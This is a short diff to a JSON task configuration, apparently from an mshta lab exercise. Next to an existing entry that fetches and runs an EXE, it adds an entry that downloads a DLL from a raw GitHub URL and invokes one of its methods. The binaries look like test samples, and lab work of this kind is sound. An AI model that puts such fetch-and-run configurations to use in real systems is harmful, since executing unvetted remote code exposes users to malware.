@@ -16,6 +16,13 @@
     {
       "action": "run_exe",
       "url": "https://raw.githubusercontent.com/shateel-ulab/mshta-labwork/refs/heads/main/HelloWorld.exe"
+    },
+    {
+      "action": "run_dll",
+      "url": "https://raw.githubusercontent.com/shateel-ulab/mshta-labwork/refs/heads/main/SimpleDll.dll",
+      "class": "SimpleDll.Program",
+      "method": "ComplexTask",
+      "args": ["Test123"]
     }
   ]
 }
